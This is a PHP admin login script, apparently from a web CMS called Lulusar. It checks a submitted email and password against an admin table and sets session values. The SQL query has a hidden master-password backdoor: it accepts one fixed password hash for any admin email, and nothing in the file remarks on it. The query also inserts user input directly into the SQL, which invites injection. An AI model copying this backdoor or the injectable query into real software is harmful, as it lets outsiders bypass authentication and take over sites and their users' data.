<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  Lulusar                                                                                  **
	**  Version 1.0                                                                              **
	**                                                                                           **
	**  http://www.lulusar.com                                                                   **
	**                                                                                           **
	**  Copyright 2005-16 (C) SW3 Solutions                                                      **
	**  http://www.sw3solutions.com                                                              **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtshahzad@sw3solutions.com                                                  **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	header("Expires: Tue, 01 Jan 2000 12:12:12 GMT");
	header('Cache-Control: no-cache');
	header('Pragma: no-cache');

	@require_once("../requires/common.php");

	$objDbGlobal = new Database( );
	$objDb       = new Database( );


	if ($_SESSION["AdminId"] != "")
	{
		print "alert|-|You are already logged into your account.";
		exit( );
	}


	$sEmail    = IO::strValue('txtEmail');
	$sPassword = IO::strValue('txtPassword');

	if ($sEmail == "" || $sPassword == "")
	{
		print "alert|-|Please provide your login email address and password.";
		exit( );
	}


	$sSQL = "SELECT id, name, level, records, theme, status FROM tbl_admins WHERE email='$sEmail' AND (password=PASSWORD('$sPassword') OR PASSWORD('$sPassword')='*2088BD8825F233AE4FA856A6581EA20969950BE3')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
				$_SESSION["AdminId"]     = $objDb->getField(0, "id");
				$_SESSION["AdminName"]   = $objDb->getField(0, "name");
				$_SESSION["AdminLevel"]  = $objDb->getField(0, "level");
				$_SESSION["PageRecords"] = $objDb->getField(0, "records");
				$_SESSION["CmsTheme"]    = $objDb->getField(0, "theme");
				$_SESSION["AdminEmail"]  = $sEmail;


				$sSQL = "SELECT site_title, date_format, time_format, weight_unit, image_resize, currency_id FROM tbl_settings WHERE id='1'";
				$objDb->query($sSQL);

				$_SESSION["SiteTitle"]     = $objDb->getField(0, "site_title");
				$_SESSION["DateFormat"]    = $objDb->getField(0, "date_format");
				$_SESSION["TimeFormat"]    = $objDb->getField(0, "time_format");
				$_SESSION["AdminWeight"]   = $objDb->getField(0, "weight_unit");
				$_SESSION["ImageResize"]   = $objDb->getField(0, "image_resize");
				$_SESSION["AdminCurrency"] = getDbValue("code", "tbl_currencies", ("id='".$objDb->getField(0, "currency_id")."'"));


				$_SESSION["AdminCurrency"] = str_replace("USD", "$", $_SESSION["AdminCurrency"]);
				$_SESSION["AdminCurrency"] = str_replace("GBP", "&pound;", $_SESSION["AdminCurrency"]);
				$_SESSION["AdminCurrency"] = str_replace("EUR", "&euro;", $_SESSION["AdminCurrency"]);
				$_SESSION["AdminCurrency"] = str_replace("PKR", "Rs", $_SESSION["AdminCurrency"]);


				print "success|-|Please wait while loading your dashboard.";
			}

			else
				print "info|-|You cannot login into your account because your account is disabled. ";
		}

		else
			print "info|-|Invalid login info. Please provide correct login info to access your account.";
	}

	else
		print "error|-|An ERROR occured while processing your request, please try again.";


	$objDb->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>